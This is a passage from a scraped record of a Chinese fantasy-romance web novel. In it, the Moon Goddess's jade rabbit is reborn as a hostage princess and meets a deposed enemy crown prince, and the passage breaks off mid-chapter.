10:08:41","description":"\n<blockquote>\n<b>【已完结，全文共2w6k字，请放心食用】</b><br><b>我是嫦娥怀里常抱着的玉兔。</b><br><b>近日鸿钧仙官总来宫里，很不对劲。</b><br><b>因为他一来，主人就不抱着我了！</b><br><b>有什么事情是我广寒宫玉兔不能听的？</b><br><br><b>于是鸿钧仙官又一次来找主人时，我悄悄捅破窗户纸，两腿一蹬，扒拉在窗沿上。</b><br><b>就让我来康康，你们到底有什么秘密！</b><br><b>朦胧之间，我听见鸿钧仙官说了一个名字。</b><br><b>瀛玉？</b><br><br><b>当天晚上，我在主人怀里做了一个梦。</b><br><b>梦里有一个男子，朝我伸出手。</b><br><b>“楼迦蓝。”</b><br><b>“我来找你了。”</b>\n</blockquote>\n<p><b><i>敌国废太子x质子九公主</i></b></p>\n<p><b>《诱兔深入》</b></p>\n<h3>1.</h3>\n<p>我是嫦娥怀里常抱着的玉兔。</p>\n<p>自上月开始，鸿钧仙官便隔三差五地来找主人，而且脸色一次比一次差。</p>\n<p>要不是知道我的主人早就有心上人，鸿钧仙官又长得实在太过磕碜……</p>\n<p>我都能怀疑他们俩之间有点什么。</p>\n<p>天界有奇闻异事很正常，主人每次与他人议事，都是将我抱在怀里一起听的。</p>\n<p>可鸿钧仙官跟主人说的事，她不让我听。</p>\n<p>怪就怪在这里。</p>\n<p>不对劲，很不对劲。</p>\n<p>有什么事情是我广寒宫玉兔不能听的？</p>\n<p>今天鸿钧仙官又来了，主人将我放置在阙月园，离开时脸上还带着忧色。</p>\n<p>好奇如我，今天就要听听，主人和鸿钧仙官究竟在瞒着我些什么！</p>\n<p>我放轻脚步，小跑到内殿。</p>\n<p>我两腿一蹬，蹦跳上窗台。</p>\n<p>我双耳并拢，战术性凑近。</p>\n<p>鸿钧仙官的声音，透过薄薄的窗户纸，断断续续传进我的耳朵里。</p>\n<p>“瀛玉就要飞升上神了，你记得到时候带玉兔避着点儿。”</p>\n<p>“我算过了，那人悟性很高，执念又太深，保不定会带着……那一世的记忆。”</p>\n<p>“天道轮回，他还是来了……”</p>\n<p>我听得朦朦胧胧，几个词连不成一句话。</p>\n<p>怪我这双耳朵，太久没用来听墙角了，改天得抽空去顺风耳那边练练听觉。</p>\n<p>不过有两个字，我听得格外清晰。</p>\n<p>瀛玉？</p>\n<p>这名字倒是好听。</p>\n<p>甚至……还有些熟悉。</p>\n<p>我之前在哪儿听过吗？</p>\n<p>嘶，怎么一想就头疼呢，罢了罢了。</p>\n<p>这时里边有了动静，似乎是两人要出来了。</p>\n<p>我连忙跳下窗台，跑回阙月园扑仙蝶。</p>\n<p>机智如我，时间算得刚刚好。</p>\n<p>2.</p>\n<p>当天晚上，我窝在嫦娥怀里，久违地做了一个很长的梦。</p>\n<p>记事以来，我就在广寒宫里，很少做梦。</p>\n<p>梦里，我的周遭十分吵闹，马鸣声，厮杀声，哭喊声不绝于耳。</p>\n<p>我似乎是在一座寝宫里，室内的装饰珠光宝气，可见这座宫殿的主人非富即贵。</p>\n<p>恍惚间，我侧过身体，在一旁的铜镜里，看见了……我的脸。</p>\n<p>这是我吗？</p>\n<p>好漂亮啊。</p>\n<p>不过，我长长粉粉的，毛茸茸的可爱耳朵呢？</p>\n<p>再低头一看，我的爪子也不见了，取而代之的，是跟我主人一样的，如羊脂玉一般细嫩的双手。</p>\n<p>“砰！”</p>\n<p>一声巨响，将我整个人吓得抖了个激灵。</p>\n<p>宫殿外黄土纷飞，但呐喊声渐息，似乎一场宏大的战事已接近尾声。</p>\n<p>这时，我的面前突然出现了一个男人。</p>\n<p>他没有穿盔甲，而是一席藏青长袍，手上持一把带血的剑，剑柄上还有一枚白色玉佩。</p>\n<p>外面明明那么混乱，他身上竟是一丝细小的伤痕都没有。</p>\n<p>他是谁？他叫什么名字？我认识他吗？</p>\n<p>我……真的是在做梦吗？</p>\n<p>为什么像是真真正正地，亲身在经历一般？</p>\n<p>他的背后是盈盈天光，又像是盏盏鬼火。</p>\n<p>他朝我伸出手，薄唇亲启。</p>\n<p>“楼迦蓝。”</p>\n<p>“我来找你了。”</p>\n<p>3.</p>\n<p>我醒来时，第一眼看见的是主人的脸。</p>\n<p>她满脸忧色，眼睛红通通的，睫毛好像都沾上了水。</p>\n<p>我想抬起爪子帮她擦擦，可是身体却软得不行，一点力气都没有。</p>\n<p>我才发现，这里似乎是鸿钧仙官的大殿，而不是广寒宫。</p>\n<p>“玉兔她先前就是因为下凡历情劫失败，阴差阳错附身到了楼岚国的一只雪兔身上，被你心软带上了天庭，抹去了记忆。”</p>\n<p>“可现在……瀛玉即将飞升，你看，玉兔她感受到了瀛玉的神力，他们之间的羁绊从未消失。”</p>\n<p>“所以她才昏睡了好几天，放在人间，又是好几年的光阴啊。”</p>\n<p>“你应该知道，她迟早会想起来过去发生的事，到时候怎么办？”</p>\n<p>“玉兔她本不该继续待在天庭的，历情劫失败的当天她就该天打雷劈，灰飞烟灭了！”</p>\n<p>“谁能想到当年你跟瀛玉，一个软心肠偷偷包庇，一个痴情种情愿背锅……”</p>\n<p>“要是放在人间，她这情况就是黑户啊……”</p>\n<p>“这次瀛玉回来，我估计他那个倔脾气，修炼这么久就是为了要来带玉兔走的，到时候你该跟天帝怎么说？”</p>\n<p>嫦娥瞪了鸿钧仙官一眼：“快闭嘴吧！有没有其他办法？”</p>\n<p>虽然我有点听不懂他们在说什么，不过这是我第一次见到主人骂人。</p>\n<p>她骂人的样子，也好好看好温柔啊。</p>\n<p>鸿钧仙官摸了一把他的大胡子：“有是有，就是有点风险……”</p>\n<p>“跟瀛玉飞升上来，玉兔恢复记忆，引发天劫雷暴，哪个风险大？”</p>\n<p>鸿钧抖了个激灵：“那……还是后者风险大一点，你跟我来。”</p>\n<p>主人抱着我，一边顺着我的毛，一边跟鸿钧仙官走进了大殿深处。</p>\n<p>我大多数时间都待在阙月园，还是第一次见到鸿钧仙官的内殿长什么样子呢。</p>\n<p>鸿钧仙官一边走一边碎碎念念：</p>\n<p>“我作为开天五大元祖之一，几亿年没用过我这轮回白月盘了。真是没想到，地府阎王干的事儿，今日我鸿钧老祖也要做啊……”</p>\n<p>“想让瀛玉不上来，那就得让玉兔下去。”</p>\n<p>“再跟瀛玉历一回情劫，看这一次，二人能不能修成正果。”</p>\n<p>嫦娥抱我的力度紧了紧：“要保住玉兔，只有这一个办法了吗？”</p>\n<p>鸿钧老祖没有回答，而是闭目作法，念了几句我听不懂的咒语。</p>\n<p>眼前那轮玉盘，竟是突然发出强光来。</p>\n<p>恍惚之间，我的身体变得很轻，好像飞了起来，主人的脸也离我越来越远……</p>\n<p>阙月园的仙蝶我还没扑到，你们这是要送我孤身一只兔去哪儿啊……</p>\n<p>眼前的白光，突然变得一片黑暗。</p>\n<p>耳边似乎有一个男人在喊我：</p>\n<p>“小兔子，小兔子？”</p>\n<p>“别睡了，笨死了，快醒醒。”</p>\n<p>再睁眼，我已在一辆摇摇晃晃的马车上。</p>\n<p>4.</p>\n<p>“九公主？九公主，您醒啦。”</p>\n<p>我揉揉眼睛，迷迷糊糊的：“……什么？”</p>\n<p>“疏桐刚刚看九公主似乎有些被梦魇住了，便喊了您几声，刚好咱们也快到了。”</p>\n<p>“唔好，疏桐，替我拿几块玉蝶酥来，本公主睡了一觉，肚子觉得有些饿了。”</p>\n<p>“是。”疏桐蹲下身，在马车的隔板里拿出一个纸袋，又拿出一个小碟，将几块玉蝶酥拿出来摆好，递到我手中：“公主请用。”</p>\n<p>我是楼岚国最不受宠，琴棋书画样样不行的九公主。</p>\n<p>上月有战事，眼看着楼岚要被北域的刍荆国攻下，父皇赶紧派使者去议和，询问能不能通过和亲来平息这事端。</p>\n<p>刍荆国同意了，但目前他们没有合适婚龄的皇子，便要我父皇先派一位公主或皇子过去当质子。</p>\n<p>我父皇问，有什么要求？</p>\n<p>刍荆国说，长得漂亮就行。</p>\n<p>疏桐急急忙忙冲进我的寝宫，告知我这件事的时候，我便知道，那是非我不可了。</p>\n<p>我楼迦蓝别的本事没有，若不是公主，单靠一张脸，放在民间也是能吃饱饭的。</p>\n<p>圣旨就是紧跟着疏桐的脚步下来的，我一边磕着玉蝶酥，一边让疏桐帮忙领旨。</p>\n<p>刚巧本公主在楼岚国也待得厌了，早就想出宫去转转。</p>\n<p>不如，就去那传闻中国富兵强，民风开放的刍荆国看一看吧。</p>\n<p>5.</p>\n<p>骏马的铁蹄声踢踏，骆驼身上的铃声也渐渐平息下来。</p>\n<p>在刍荆国钦差大臣及军队的接见下，我们随他入了宫。</p>\n<p>刍荆国的吃食和环境令本公主甚是满意，并且皇帝也不似传闻中那么可怖，反而笑眯眯的，令人尊敬又亲切。</p>\n<p>不像我父皇，整天端着个架子。</p>\n<p>刍荆国的几位皇子，果真是如使臣所说，大的大，小的小。</p>\n<p>大的已经成婚，小的还未到总角之年，但是看起来都很和睦。</p>\n<p>不像楼岚国，几个皇兄为了一个太子之位，死的死，伤的伤，残的残。</p>\n<p>一边你给我下药，一边我给你捅刀，最后头破血流，也没个结果。</p>\n<p>刍荆国的吃食也很好，除了玉蝶酥在我心里永远排第一，其余的都能比楼岚国的好。</p>\n<p>烤鸭卤鹅炖蹄髈翡翠青菜乳鸽萝卜汤……</p>\n<p>当晚，我兴奋地睡不着觉。</p>\n<p>悄悄推门一看，疏桐却已经在小榻上睡得很沉，我伸手在她眼前晃了一下，她鼻翼动了动，翻了个身，愣是没醒。</p>\n<p>那本公主可要跑出去玩啦！</p>\n<p>我蹑手蹑脚地拿了根竹簪，随意往头发里面一插，便提着裙摆跑了出去，一路到了我一直心心念念的藏宝阁。</p>\n<p>听钦差大臣说，这里面有许多有趣的玩意儿，平时只要是宫中的人，都可以随意把玩，只要不带走就行。</p>\n<p>我悄悄从一楼的窗户里翻了进去，藏宝阁里面一盏灯都没有，不过我眼神好，很快适应了这里的光线，踩着楼梯上了顶层。</p>\n<p>6.</p>\n<p>我刚上到顶楼，脚步就挪不动了。</p>\n<p>没想到的是，这里居然有人！</p>\n<p>只见那男子身着一席黑衣，似乎是在往腰间藏什么东西。</p>\n<p>完了，来这里第一天，就遇着了小偷。</p>\n<p>我刚想开溜，黑暗里背对着我的那个男人，居然叫住了我！</p>\n<p>“一个小丫头，三更半夜来这里干什么？”</p>\n<p>“我……”</p>\n<p>我嘴上答应着，手却向发丝间伸去。</p>\n<p>那根出门前随意插上的竹簪，其实是一柄锋利无比的匕首。</p>\n<p>“不想死就别说话。”</p>\n<p>我：“……”</p>\n<p>虽然有点凶，但我听得出对方似乎并无敌意，于是刚刚伸向竹簪的手，又垂了下去。</p>\n<p>我小声嘟囔：“明明只有你在说话。”</p>\n<p>而且，是你先问我的好不好！讲不讲道理？</p>\n<p>男人哂笑了一声，转身向我走来。</p>\n<p>我战术性后退一步，本能地有些害怕。</p>\n<p>他背对着月色，面孔在黑暗里看不真切，我只看得出他长得很高，轮廓似乎还挺好看。</p>\n<p>“嗯？不怕我么？身量跟只小兔子似的，倒是挺有趣。”</p>\n<p>我踌躇了一下：“那个……请问，我现在可以说话了么？”</p>\n<p>毕竟你刚刚说过，要是我说话会死欸。</p>\n<p>男人盯着我，看了半天，蹦出一句：</p>\n<p>“之前没见过你。是神仙？还是妖怪？”</p>\n<p>我被他这一番话整得莫名其妙，要不是这男人声音确实好听，我才不要理他呢。</p>\n<p>“我是楼岚国的九公主，我知道自己很好看，但非要说成神仙妖怪吧，倒也不必。”</p>\n<p>“……”对面的男人一时语塞：</p>\n<p>“你就是那个楼岚国来的质子九公主？”</p>\n<p>我点点头，而这一次，我借着月光，终于看清楚了他的脸。</p>\n<p>刚才他对我说的话，我现在真想再说一遍。</p>\n<p>他究竟是神仙还是妖怪，能长得这般好看？</p>\n<p>我与疏桐悄悄藏的话本子上，有一句叫作“郎艳独绝”的。</p>\n<p>我先前怎么也想不出那样的男子，究竟该是什么样的。</p>\n<p>现在看来，大抵，就是他这样的吧。</p>\n<p>“那你呢？你叫什么名字？”我脱口而出。</p>\n<p>黑衣男子却不理会我，径自向窗棂处走去，似乎是要从窗口离开。</p>\n<p>怎么说这里距地面也有数十米，即便知晓他会功夫，我还是出声提醒了一句：</p>\n<p>“那……你记得当心点啊。”</p>\n<p>“虽……虽然藏宝阁不许偷东西，但我会替你保守秘密的。”</p>\n<p>“你放心，我楼迦蓝一言九鼎，绝对守口如瓶，不反悔！”</p>\n<p>听见这话，他脚步一顿。</p>\n<p>相互沉默地对峙片刻，对方居然轻笑了声。</p>\n<p>“知道了。”</p>\n<p>他一脚踏上窗沿，回头与我对视：</p>\n<p>“真像小兔子。笨死了。”</p>\n<p>我心道：你才是小兔子呢，还有，你说谁笨？</p>\n<p>我楼迦蓝小公主，可是四海八荒第一小聪明！</p>\n<p>“记住了，小公主。”</p>\n<p>“我叫瀛玉。”</p>\n<p>我一惊，再往哪处看去，却只来得及看见一个黑色的身影飞跃而下。</p>\n<p>我连忙跑到窗边一看，哪里还有他的影子？</p>\n<p>耳边又传来他的声音。</p>\n<p>原来他叫瀛玉。</p>\n<p>瀛玉？</p>\n<p>这名字倒是好听。</p>\n<p>【我起的名字，全都是在“缺月挂疏桐，漏断人初静”这一句里面抽的。广寒宫里的阙月园，公主的丫鬟疏桐。两个国家，楼岚国，刍荆国。】</p>\n<p>【总之，谐音梗，是阿郁心里，起名yyds】</p>\n<hr>\n<h3>7.</h3>\n<p>第二天醒来，疏桐跟我说，昨晚发生了一件大事。</p>\n<p>“什么大事？”我有了些兴致。</p>\n<p>“藏宝阁失窃了！”</p>\n<p>我：“哦，这样啊。”</p>\n<p>疏桐：“……公主，您这个反应，看起来特别像是早就知道的。”</p>\n<p>“怎么可能？”</p>\n<p>我在床上坐定：“那，这藏宝阁失窃了什么东西？现在我还能去玩吗？”</p>\n<p>“我也不知是丢了什么，具体还得问管理藏宝阁的人吧，现在这情况，还要进去玩，大抵是难了。”</p>\n<p>“公主，这刍荆国也真是奇葩，大晚上不锁上藏宝阁的门，也不派侍卫严加把守，宝贝不丢才怪呢！”</p>\n<p>我重重点头：“是啊，笨死了。”</p>\n<p>“不说这个了，公主快起来洗漱吧，今日是刍荆国大皇子瀛季的生辰，大白天是没什么事儿，不过晚上咱们也是要去宴席上吃饭的。”</p>\n<p>我点点头，又一愣：“大皇子叫什么？”</p>\n<p>“瀛季啊。”</p>\n<p>疏桐呆呆的：</p>\n<p>“公主，您这是怎么了？”</p>\n<p>我摇摇头，说没事。</p>\n<p>刍荆国的皇子公主，姓氏全都是瀛字。</p>\n<p>那瀛玉，也该是皇子？</p>\n<p>可为什么我刚到刍荆国时，在昨天的那个宴席上，没有见到瀛玉呢？</p>\n<p>怀着疑问的心情，我啃完一大盆小厨房送来的酱香鸭头，便让疏桐替我梳妆，坐上了去大皇子生辰宴的马车。</p>\n<p>8.</p>\n<p>我的位置其实在十分角落的地方，可疏桐扶着我一落座，我就感到有几十双眼睛顷刻间都注视在我身上。</p>\n<p>本想沉默地吃个饭，见此我只好站起身，朝大家行了个礼。</p>\n<p>人齐了，我终于可以开始吃我心心念念的椰蓉糕青稞饼芥子酥梅干菜薄酥皮，烤鸡卷饼鸡蛋羹炸小鱼干红烧酱鸽蟹黄汤包……</p>\n<p>倘若是我现在抬起头，就能看见刍荆国皇帝私下里扫了一圈，满脸不情愿地哼了一声。</p>\n<p>倒是大皇子主动提起，引起了我的兴趣。</p>\n<p>“二弟今日还没来么？他上周的午后还曾与我对弈，说在我的生辰上要送我一样好礼物。”</p>\n<p>坐在王位上的男人冷哼一声：“他要是来，我立马给他轰出去！”</p>\n<p>大皇子莞尔：“父皇又是何必？二弟是好心，况且他一向机敏，说要来，便是必会来的，儿臣也很期待他的贺礼。”</p>\n<p>我听了这些话，大概也了解了。</p>\n<p>二皇子一定是瀛玉，但瀛玉与皇帝关系很僵硬，所以才没有出现在先前的宴会上。</p>\n<p>从现在皇帝的态度来看，瀛玉这个人，似乎是犯过什么天大的错误，才会让皇上嫌恶到如此的地步。</p>\n<p>不过我想想昨天，瀛玉这人又是偷东西，又是嘴欠的，我要是他爹，我也看见他就烦。</p>\n<p>除了长得好看点，令人赏心悦目。</p>\n<p>唉，真矛盾。</p>\n<p>“我皇兄的生辰，怎么不等我到便开始了？”</p>\n<p>哟，我心道有趣，真是说什么来什么，还未见其人倒是先闻其声。</p>\n<p>我从一堆糕点中抬起脸来，瀛玉站在天光之下，一身藏青色锦袍，头发用高冠束起。</p>\n<p>弯唇不羁一笑时，风流倜傥。</p>\n<p>即便已经是第二次见面，我还是看得有点呆。</p>\n<p>毕竟上一次是夜里，这张脸没有现在看得这么清晰。</p>\n<p>瀛玉上前两步，从宽大的袖中抽出一把短剑，直接朝前堂一扔！</p>\n<p>我差点惊呼出声，以为他要刺杀皇上！</p>\n<p>“藏宝阁找了一天的玉扳指，这就还你！”</p>\n<p>“嗖！”的一声，短剑稳稳地落在瀛季手中，后者会心一笑：</p>\n<p>“原来是你。我看看，你用这玉扳指做了什么好物。”</p>\n<p>那是一柄周身通透锃亮的宝剑，剑柄上面镶嵌着零零碎碎的玉石。</p>\n<p>瀛玉声调慢吞吞的，既放纵又恶劣：</p>\n<p>“我思来想去，这柄短剑上总要嵌点什么才好看。于是昨夜去藏宝阁里拿了顶层的玉扳指，将它打碎了填在上边，皇兄可喜欢？”</p>\n<p>我在一边听着目瞪口呆，嘴巴都忘记嚼了。</p>\n<p>……就这么大大方方承认了？</p>\n<p>这是恃宠而骄还是真不要命啊？</p>\n<p>这人可真是目中无人，嚣张至极。</p>\n<p>亏我还巴巴地跟他保证，自己绝对不会说出去呢！</p>\n<p>怪不得，昨天他要说我笨死了……</p>\n<p>因为他根本没想瞒着啊！</p>\n<p>9.</p>\n<p>送完了礼物，瀛玉扫了一眼前堂的位置，嘴角勾了一下，便往大门处走。</p>\n<p>皇帝自始至终没说一句话，殿内的其余人都自觉俯身，嘴里念念有词：</p>\n<p>“恭送二皇子。”</p>\n<p>我也想学着他们有礼貌地送一送，可刚抬起头，便跟瀛玉的眼神撞了个满怀。</p>\n<p>瀛玉的步伐猛的顿住。</p>\n<p>下一刻，他冲我笑眯眯地弯起眼睛：</p>\n<p>“谁说我要走了？我只是挑个自己喜欢的好地方坐下，好慢慢喝我皇兄的生辰酒。”</p>\n<p>我：“......”</p>\n<p>刍荆国的风气还真是开放，皇子居然敢大庭广众之下给兄长和父亲甩脸色，放着给他好心留的位置不坐，偏要自己再挑。</p>\n<p>而且，我的心头升起一股不详的预感。</p>\n<p>果真，瀛玉一脸云淡风轻地在我身旁空着的位置上坐了下来，丝毫不顾及周遭的目光，自顾自地喝起酒来。</p>\n<p>疏桐在我耳边说悄悄话：“公主，这位二皇子，可是与您有什么交情？怎么看着像是认识。”</p>\n<p>“我也不知道，他八成是有毛病！你没看见他刚刚的样子？我怎么可能认识他！”</p>\n<p>我也转过去，用我自己都听不清的声音跟疏桐咬耳朵，肩上却冷不丁被拍了一下。</p>\n<p>一回头，便遇上瀛玉那张似笑非笑的脸。</p>\n<p>说真的，怎么看都没什么缺点的脸，无论这人性格有多欠，也能令人心情大好。</p>\n<p>可惜这张脸的主人，长了张嘴。</p>\n<p>“小兔子，你们楼岚国的人，是不是都喜欢翻脸不认人？”</p>\n<p>我瞪大眼睛：“我这么小的声音，你也能听见？”</p>\n<p>“那就是间接承认了。”瀛玉身体向后靠，两手撑着地面，表情似是可惜：</p>\n<p>“顶好的面孔，怎么就生了这么个脑子？”</p>\n<p>我气得直接不理他了。</p>\n<p>疏桐在身后小声道：“公主，昨晚上您是真的跑去藏宝阁玩了吧。”</p>\n<p>我还没回应，瀛玉先笑了：“看看！你这丫头都比你激灵。”</p>\n<p>我：“......”</p>\n<p>您是顺风耳转世吗？</p>\n<p>听悄悄话这么熟练。</p>\n<p>10.</p>\n<p>宴会结束后，我其实对瀛玉这个人，反而更加关注了起来。</p>\n<p>讨厌归讨厌，可好奇如我，很想知道为什么他身为二皇子，却很少露面？</p>\n<p>看他的样子，似乎是与我年纪相仿，大不了两岁，应该也未娶亲。</p>\n<p>可之前刍荆国皇帝说了，这里没有适合婚配的皇子......</p>\n<p>妈呀！还好这皇帝不喜欢瀛玉！都没把他算在皇子里面！</p>\n<p>不然，现在和瀛玉那讨厌的家伙成亲的，可不就是我么！</p>\n<p>想想也刺激，啊不是，想想都后怕。</p>\n<p>回到寝殿中，我让疏桐发挥她那八卦的本事，把瀛玉的老底扒点出来。</p>\n<p>疏桐不负所望，很快带着消息回来了。</p>\n<p>但她开口的时候，却一脸沉重。</p>\n<p>“公主，疏桐真是问了一大圈，才换回的消息。”</p>\n<p>“那些个宫女，一个个都不敢说，还是我将自己的月银都搭了进去，才肯松口的！”</p>\n<p>我大手一挥：“给你加半年的月钱，快说。”</p>\n<p>疏桐忧色未变：“疏桐也不是心疼银子，知道公主对疏桐好，疏桐把命搭给公主也是愿意的。”</p>\n<p>“只是，这二皇子......”</p>\n<p>我起了兴致：“到底是什么事？这么支支吾吾的。”</p>\n<p>疏桐一股脑儿说了出来：“这二皇子是刍荆国先皇后所生，听宫女们说，他自出生起便是天之骄子，礼乐射御书术样样精通，未出生前便已经被封为太子！”</p>\n<p>“二皇子，曾经是太子！”</p>\n<p>我一惊：“太子？”</p>\n<p>我一直以为，太子是那位已经成亲的大皇子。</p>\n<p>现在想来才发现，大皇子的妻子，谁也不会喊她太子妃呀。</p>\n<p>原来如此，那现在的刍荆国，居然是没有太子的么？</p>\n<p>“曾经是太子？那现在是怎么回事？”</p>\n<p>“就在半年前，是刍荆国皇帝亲口下旨废的太子！”</p>\n<p>“为什么？”</p>\n<p>“因为......”</p>\n<p>疏桐深呼吸，才将后面的二字吐了出来。</p>\n<p>“因为弑母。”</p>\n<p>11.</p>\n<p>之后的好几天，我的生活里都没有再出现瀛玉这个人的影子。</p>\n<p>我这个质子呢，可真算是当得天仙一般。</p>\n<p>什么麻烦事没有，住得好又睡得好，吃嘛嘛香，身体倍儿棒。</p>\n<p>不过......偶尔还是会有点想家。</p>\n<p>楼岚国没什么好的，可那依然是我的母国。</p>\n<p>昨天是正月十五，皇宫很热闹，我也参加了中秋夜宴，烤鸭很好吃。</p>\n<p>不过，瀛玉没有出现。</p>\n<p>俗话说，十五的月亮十六圆。</p>\n<p>今天晚上，疏桐又睡得很早，徐徐的鼾声很快透过帘子钻了进来。</p>\n<p>我坐在床沿上，仰头望着天上那一轮皎洁的明月，怎么也睡不着，干脆起身出了门。</p>\n<p>从小厨房拎了一坛鹤泠，我偷偷摸摸爬上了摘月轩的屋顶。</p>\n<p>这地方我早就想来了，听疏桐说了，刍荆国宫里的摘月轩，是皇上和先皇后曾经最喜欢来的地方，这里最高，离天空最近，像是伸手可以摘见月亮似的。</p>\n<p>先皇后离世以后，此处便无人问津了。</p>\n<p>即便皇上没有明令禁止，但也没有人敢随便来这里。</p>\n<p>我刚一只脚从椅子上离开，又被吓了一跳。</p>\n<p>怎么会有人？</p>\n<p>定睛一看，不是瀛玉又是谁？</p>\n<p>瀛玉这时也看见了我，似乎也很惊讶：“小兔子？”</p>\n<p>我站着没动。</p>\n<p>瀛玉眼睛弯起来。</p>\n<p>“小兔子，要不要过来？”</p>\n<p>唉。</p>\n<p>他那双桃花一般的眼睛，真是勾人啊。</p>\n<p>一步步诱人深入，却无法控制。</p>\n<p>反正已经被发现了，我便将另一条腿也搭上了屋顶，拎着鹤泠走到他身边。</p>\n<p>“我们楼岚国最好的鹤泠，我分给你喝，今晚的事情，不许说出去。”</p>\n<p>“你以为我稀罕这个？”瀛玉挑眉。</p>\n<p>我有些手足无措。</p>\n<p>“我......我也没有什么好东西可以给你了。”</p>\n<p>瀛玉表情有一瞬间的僵硬。</p>\n<p>他叹了口气：“没事儿说这么丧气的话作甚，拿过来，我勉为其难喝两口。”</p>\n<p>12.</p>\n<p>我在他身边盘腿坐下来，给他满上一杯酒。</p>\n<p>“月亮真圆啊。”我叹了口气：“这里风光真好，想起来自我记事起，便没怎么好好看过月亮，第一次仔细去赏，居然已经不在故乡了。”</p>\n<p>瀛玉没说话。</p>\n<p>身边有个人，不说话我就难受，于是便主动抛问：“你呢？瀛玉？你也睡不着吗？”</p>\n<p>后者很轻地闭了一下眼睛。</p>\n<p>“我......在想一个人。”</p>\n<p>“谁？”其实我心里已经有了猜测，但不太敢直接说。</p>\n<p>“先皇后，我的母亲，我很想她。”</p>\n<p>一股子凉意直接从背后爬上脑门！</p>\n<p>我直接抖了个激灵，手中的酒都洒了几滴出来。</p>\n<p>没想到瀛玉这么坦诚，果然这种话他亲口说出来，到底还是教我有些害怕的。</p>\n<p>瀛玉到底有没有弑母我不知道，不过他武功高强，要是想杀我，自然是随时可以杀。</p>\n<p>所以，想到这里，我便也没那么害怕了。</p>\n<p>瀛玉见此，摆出一副嫌弃的神色，抬起手替我擦去了衣领上的几滴酒渍：</p>\n<p>“笨死了，你从小在楼岚国就这么笨？”</p>\n<p>大抵是因为微醺，我酒量本身不好，一听他这话就立马炸了毛：</p>\n<p>“你才笨，我再笨也没丢了自己的位置，哪像你还把太子的名号给作没了！”</p>\n<p>我这话一出，四周瞬间鸦雀无声。</p>\n<p>瀛玉刚刚要收回去的手，就这么顿在空中。</p>\n<p>良久，他轻笑了一声。</p>\n<p>“你知道？”</p>\n<p>我有点后怕，但喝酒壮人胆是真的，便用力地点点头：“知道。”</p>\n<p>“哦，这样啊。”瀛玉若有所思地看着我，似乎发现了什么很有趣的事情。</p>\n<p>“你知道我连弑母这种事都干得出来，居然还气定神闲地坐在这里跟我喝酒？”</p>\n<p>“楼伽蓝，你真是笨到家了，想想若是生在寻常人家，谁还要你这小兔子？”</p>\n<p>“幸好我不是太子了。”</p>\n<p>“可惜我不是太子了。”</p>\n<p><b>【求赞！求赞！求赞！这是个神话文～】</b></p>\n<hr>\n<h3>13.</h3>\n<p>那个晚上，我拉着瀛玉说了很多的话。</p>\n<p>以前在楼岚国被兄弟姐妹排挤，因为生母是爬了龙床的宫女而遭父皇嫌弃......</p>\n<p>这些曾经我告诉自己没什么大不了的事，在这一刻，似乎都化成了天大的委屈。</p>\n<p>我跟瀛玉其实并不熟悉，可我却有一种感觉，瀛玉不是坏人。</p>\n<p>甚至与我有些相似，在这寒冷的宫殿中，是需要钻木取火，抱团取暖的。</p>\n<p>到后来，一摊子上好的鹤泠，被我糟蹋了个精光。</p>\n<p>“臭小孩子，说好的分我一半，到最后全进自己肚子里了，还得要我善后。”</p>\n<p>迷迷糊糊之间，我感到自己置身于一片宽阔和温热之上。</p>\n<p>瀛玉很瘦，那一双蝴蝶骨，时常还会咯到我。</p>\n<p>我趴在他的背上，一边碎碎地呓语：</p>\n<p>“瀛玉......瀛玉，你轻点，慢点呀，我疼......”</p>\n<p>瀛玉听见我这么说，愤愤地立刻开骂：</p>\n<p>“楼伽蓝！你在说什么东西！你在做梦吗？你疯了？”</p>\n<p>“不是......”</p>\n<p>我皱眉，半梦半醒之间，也不知道瀛玉生气的点在哪里，倒是自己委屈上了：</p>\n<p>“我说你太瘦了，骨头咯得我好疼，你走慢点就好了，骂我干什么......”</p>\n<p>瀛玉：“......拿你没辙。”</p>\n<p>“瀛玉......你之前是不是说，要当个江湖剑客啊？”</p>\n<p>“嗯？嗯。”</p>\n<p>“其实......我也有一个大胆的想法。”</p>\n<p>“什么？”</p>\n<p>“要是你真是太子就好了。”</p>\n<p>“为什么？”</p>\n<p>“因为我想当皇后。”</p>\n<p>喝了酒的我真是什么都敢说，自顾自地喃喃道：</p>\n<p>“我想至高无上，让大家都不敢欺负我。”</p>\n<p>“这样啊。”瀛玉淡淡道。</p>\n<p>14.</p>\n<p>再后来，我就睡着了。</p>\n<p>到我醒过来，已经是自己的寝宫。</p>\n<p>不过昨晚上有一段记忆，我自己也分不清是真是假，是真的存在，还是我的臆想。</p>\n<p>快回到我的宫殿时，瀛玉似乎曾经轻轻喊过我。</p>\n<p>“小兔子，小兔子？还醒着么？”</p>\n<p>“唔......”</p>\n<p>“你告诉了我那么多秘密，那我便也大发慈悲，告诉你一个，好不好？”</p>\n<p>“嗯......”</p>\n<p>“我没有弑母。”瀛玉说。</p>\n<p>他的语气十分认真，不像平时的他。</p>\n<p>那一刻晚风吹拂，带来清爽的桂花香。</p>\n<p>“我母后病情加重时，是她求我不要去找太医。”</p>\n<p>“她从来不爱父皇，却为这深宫困了一辈子。”</p>\n<p>“是她让我给她带的药。”</p>\n<p>“小兔子……我答应我母后了。”</p>\n<p>“她走得真的很安详。”</p>\n<p>“我一直陪着她……”</p>\n<p>“我父亲也知道，我的母后不爱他，是自己求一个解脱的。”</p>\n<p>“但他还是废了我的太子之位。”</p>\n<p>“毕竟，这件事情，间接性是我导致的。”</p>\n<p>“其实这太子之位，我从没在乎过，我们几个兄弟之间，谁当都是一样的，不要也罢。”</p>\n<p>“当皇帝累死了，让我选的话，我要去走江湖，浪迹天涯，当个行侠仗义的剑客就好。”</p>\n<p>“我不想跟我母亲一样，一生被束缚在宫中，连早一些死去，都是求来的。”</p>\n<p>“等我皇长兄再大一些，你要不跟我一起出宫吧？看你也不是很想待在一个地方不动的人，怪不得，跟小兔子这么像。”</p>\n<p>“行了，秘密我反正已经说了，至于你听没听见，那就另当别论了。”</p>\n<p>15.</p>\n<p>我又做梦了。</p>\n<p>先是朦朦胧胧的一片清光，我穿着浅蓝色的衣裙，在一棵月桂树下吃点心。</p>\n<p>那桂树真是香气扑鼻，似乎是天境里的一般，还氤氲着微光。</p>\n<p>这时一位身姿曼妙的女子从大殿中出来，见到我后掩面轻笑：</p>\n<p>“伽蓝，到底是个小仙官，怎的如此贪吃？”</p>\n<p>她认识我？她是谁？</p>\n<p>我来不及细想，身下却一脚踏空，我似乎飞了起来，但很快便又虚空下坠，落在了地面上。</p>\n<p>刚才是一切不复存在，此刻天空乌云密布，天